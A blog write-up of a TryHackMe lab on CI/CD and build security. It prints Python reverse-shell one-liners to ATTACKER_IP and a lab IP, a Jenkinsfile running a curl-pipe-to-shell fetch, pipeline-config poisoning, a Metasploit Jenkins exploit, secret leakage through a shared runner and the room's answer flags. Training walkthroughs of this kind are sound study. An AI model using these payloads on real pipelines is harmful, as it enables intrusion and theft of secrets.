---
title: "TryHackMe: CI/CD and Build Security"
date: 2025-03-04 10:00:00 +0000
categories: [WriteUps, TryHackMe]
tags: [ci/cd, build security, pipeline security, devsecops, tryhackme]
author: "JT"
pin: false
toc: true
comments: true
---
Welcome to my write up on TryHackMe's CI/CD and Build Security room. 
## Important Notes

If you ever lose your ability to access Gitlab, make sure that your network is up.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228013316.png)


Later on when creating reverse shells make sure to use the CCID IP and not your machine IP.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228013453.png)


## Task 1: Introduction
Let's get started no information needed here
## Task 2: Setting Up
### Setting Up /etc/hosts
`sudo echo 10.200.6.150 gitlab.tryhackme.loc >> /etc/hosts && sudo echo 10.200.6.160 jenkins.tryhackme.loc >> /etc/hosts`
`
And visit: http://gitlab.tryhackme.loc

Register an account with gitlab and if you can login then you are ready to go.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250304212406.png)

### Register with the mother
The mother is will be used for getting flags later on in this room. Use your TryHackMe username to login

![Alt Text](/assets/images/CICDImgs/Pasted image 20250227234122.png)

Ensure you can log in and we are ready to go

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228013644.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250304212423.png)

## Task 3: What is CI/CD and Build Security?
All these questions can be found in the reading

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228013135.png)

```
build orchestrator
build agents
maximum visibility
```
## Task 4: Creating Your Own Pipeline
The first step is to ensure that php is installed and the version is correct. If not you can install it using `sudo apt install php7.2-cli`.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228015718.png)

Then go to gitlab and fork the basic build project. 

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228015852.png)

Now we will setup the runner. A runner in a CI/CD pipeline is an agent that executes pipeline jobs, automating tasks like testing, building, and deploying code. 

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228020034.png)

Click on the tree buttons next to the "New Project Runner" button and you will be greeted with the following commands. Run these in order to set up the runner on your attackbox:
```
sudo gitlab-runner register --url http://gitlab.tryhackme.loc/ --registration-token GR1348941cAFmy1CKG7GomLBBpsBs
```
```
# Download the binary for your system
sudo curl -L --output /usr/local/bin/gitlab-runner https://gitlab-runner-downloads.s3.amazonaws.com/latest/binaries/gitlab-runner-linux-amd64

# Give it permission to execute
sudo chmod +x /usr/local/bin/gitlab-runner

# Create a GitLab Runner user
sudo useradd --comment 'GitLab Runner' --create-home gitlab-runner --shell /bin/bash

# Install and run as a service
sudo gitlab-runner install --user=gitlab-runner --working-directory=/home/gitlab-runner
sudo gitlab-runner start
```

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228020240.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250228020447.png)

Now let's head back to gitlab and we will see that our project runner has been created

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228020512.png)

Edit the setting of the runner and select the "Run untagged jobs" button

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228020541.png)

If your build fails like so:

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228021932.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250228022002.png)

Simply run this command and it should resolve the issue. You can then retrigger the pipeline by pressing the refresh button shown above.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228022046.png)

Now we can navigate to `http://127.0.0.1:8081`

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228022306.png)

Finally let's complete this task by logging in with the credentials `admin:admin`

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228022353.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250228022424.png)

```
Gitlab Runner
THM{Welcome.to.CICD.Pipelines}
```
## Task 5: Securing the Build Source
Navigate to the "Access Tokens" section in the user settings.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228014330.png)

Create a new Personal Access token 

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228014317.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250228014358.png)

Update the enumerator.py file shown below with you new personal access token.
```python
import gitlab
import uuid

# Create a Gitlab connection
gl = gitlab.Gitlab("http://gitlab.tryhackme.loc/", private_token='REPLACE_ME')
gl.auth()

# Get all Gitlab projects
projects = gl.projects.list(all=True)

# Enumerate through all projects and try to download a copy
for project in projects:
    print ("Downloading project: " + str(project.name))
    #Generate a UID to attach to the project, to allow us to download all versions of projects with the same name
    UID = str(uuid.uuid4())
    print (UID)
    try:
        repo_download = project.repository_archive(format='zip')
        with open (str(project.name) + "_" + str(UID) +  ".zip", 'wb') as output_file:
            output_file.write(repo_download)
    except Exception as e:
        # Based on permissions, we may not be able to download the project
        print ("Error with this download")
        print (e)
        pass
```

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228014439.png)

If you run into a problem with missing dependencies the easiest way to solve this on the Attackbox is by making a python virtual environment. Then just install the package.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228014624.png)

Now we can run the enumerator and it will download a bunch of files

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228014649.png)

We will be focusing on the mobile app file, let's unzip it.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228014737.png)

Then we can cd in and use `grep -iR key *` to find any references to key in the directory.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228014812.png)

This worked and we can now finished with this task.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228014057.png)

```
.gitignore
branches
unauthorised tampering
THM{You.Found.The.API.Key}
```
## Task 6: Securing the Build Process

This task is pretty straight forward. Start by forking the `Merge Test` project in gitlab. 

Create a new directory on the Attackbox using 
```
mkdir task6
cd task6
```
Create a file called `shell.sh` and put the following code inside:
```bash
/usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```
Host the file on using a simple python http server:
```
python3 -m http.server 8080
```
Create a listener the reverse shell will attach to:
```
root@AttackBox:~$ nc -lvp 8081 
Listening on 0.0.0.0 8081 
```
Finally, go to gitlab and add the following to the jenkinsfile. This will reach out the http server, download the shell.sh file and run it. This will then create a reverse shell and connect to our listener.  
```
pipeline { 
	agent any stages 
	{ stage('build') 
		{ steps 
			{ sh ''' 
				curl http://ATTACKER_IP:8080/shell.sh | sh 
				''' 
				} 
			} 
		} 
	}
```
With an luck we should see this in our listener
```
Connection received on jenkins.tryhackme.loc 55994 
/bin/sh: 0: can't access tty; job control turned off 
$ whoami 
ubuntu
```
Now just follow the steps in the mother:

![Alt Text](/assets/images/CICDImgs/Pasted image 20250227235000.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250227235019.png)

We have the flag and have completed the task.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250304210111.png)

```
secure registry
secret management
dependency confusion
THM{7753f7e9-6543-4914-90ad-7153609831c3}
```
## Task 7: Securing the Build Server

Navigate to `http://jenkins.tryhackme.loc:8080` and log in with the default credentials `jenkins:jenkins`

![Alt Text](/assets/images/CICDImgs/Pasted image 20250227235326.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250227235403.png)

This is good, we know some credentials, and now we can use the `msfconsole` to exploit those and get a shell. Let's start by running the `use exploit/multi/http/jenkins_script_console` to select the right exploit and see what we can do with it

![Alt Text](/assets/images/CICDImgs/Pasted image 20250227234214.png)

Now let's configure it to work for the `jenkins` machine

![Alt Text](/assets/images/CICDImgs/Pasted image 20250227234415.png)

Now that we have a shell let's go back to mother and see what we need to do to get the flag

![Alt Text](/assets/images/CICDImgs/Pasted image 20250227234813.png)

Simply follow the steps that mother has for us...

![Alt Text](/assets/images/CICDImgs/Pasted image 20250227234719.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250227234648.png)

Perfect our file is set up and all we have to do is tell the mother to verify that we have complete the task to get our flag: 

![Alt Text](/assets/images/CICDImgs/Pasted image 20250227234845.png)

We have the flag let's move on.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250304210446.png)

```
VPN
Token-based authentication
THM{1769f776-e03c-40b6-b2eb-b298297c15cc}
```
## Task 8: Securing the Build Pipeline
Now we have to login to gitlab with a different account `anatacker:Password1@`

![Alt Text](/assets/images/CICDImgs/Pasted image 20250227235812.png)


Navigate to: http://gitlab.tryhackme.loc/ash/approval-test

Edit the `.github-ci.yml` file to add our script to download our reverse shell again. 
```bash
/usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",8082)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228000942.png)

Open a new `nc` listener.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228001046.png)

Commit your changes and create a merge request. Then set the merge request to auto-merge. This will immediately add the code to main on successful running of the pipeline 

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228000152.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250228001128.png)

If we head back to our listener we should see that we have a shell

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228001138.png)

Let's find what machine we are on so we can give the hostname to the mother:

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228001218.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250228001228.png)

Now let's give the hostname `GRunner01` to the mother

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228001300.png)

Now let's do what the mother says by adding the flag

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228001415.png)

Finally let's verify with the mother to complete the room.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228001456.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250304210545.png)

```
merge requests
limit runner access
THM{2411b26f-b213-462e-b94c-39d974e503e6}
```
## Task 9: Securing the Build Environment
Head to http://gitlab.tryhackme.loc/ash/environments/ and then in the side bar go to `Operate -> Environments` 

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228001911.png)


Switch to the `dev` environment

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228002258.png)

Make some sort of change to `README.md` and create a merge request. 

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228002410.png)


As you can see the merge request on dev was successful and `README` was updated to display test

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228002634.png)


Now let's look at the `Build->Jobs` and check the runner of the merge request we just made

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228002518.png)


Now lets look at one for a production merge request. They are the same. This means by compromising the `dev` runner we can do so for the `prod` runner too.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228002818.png)


On the dev branch let's add our trusty reverse shell script. To the `.gitlab-ci.yml` file, and merge it in.
![Alt Text](/assets/images/CICDImgs/Pasted image 20250228003905.png)

```
stages:
  - deploy

production:
  stage: deploy
  script:
    - /usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.50.4.149",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
    - 'echo "Deploying to ${CI_ENVIRONMENT_NAME}"'
  environment:
    name: ${CI_JOB_NAME}
```

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228003955.png)


Now we are on GRunner02, but we need to get to the dev and prod machines to compromise them. Let's explore some ways to do that

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228010227.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250228010310.png)

 

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228004557.png)

Unfortunately we are not able to use SSH because we do not have a good shell, this caused it to crash. 
Let's get our shell back by rerunning the pipeline

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228005728.png)


Now let's get a proper shell and try again
````bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
````

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228010439.png)

Now let's try to ssh again

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228010602.png)

Now we are in, let's complete the steps from the mother

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228011124.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250228010938.png)

Now let's verify with the mother 

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228010957.png)

There is the flag from the `DEV` machine

Now let's follow the same steps to get the flag for the `PROD` machine and complete the room.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228011049.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250228011203.png)


![Alt Text](/assets/images/CICDImgs/Pasted image 20250304211018.png)

```
isolate environments
THM{28f36e4a-7c35-4e4d-bede-be698ddf0883}
THM{e9f99dbe-6bae-4849-adf7-18a449c93fe6}
```
## Task 10: Securing the Build Secrets
The project is using an API Key variable as we can see in the logs.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228011453.png)

However on the it is using a different variable on the dev side, because the project is using the same runner for dev and prod we should be able to leak the production API key.

Let's simply copy the `.gitlab-ci.yml` from main to dev as in main it is making use of the `API_KEY` variable

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228012758.png)


Now lets go back to our reverse shell from Task 9 and we can get the flag

![Alt Text](/assets/images/CICDImgs/Pasted image 20250228012640.png)

**Note:** If you do not see the key, add the reverse shell back to the `.gitlab-ci.yml` file and restart the shell, then you should be able to access it.

![Alt Text](/assets/images/CICDImgs/Pasted image 20250304210944.png)

```
nay
THM{Secrets.are.meant.to.be.kept.Secret}
```

## Conclusion
Thanks for reading through my writeup, hopefully it helped. 
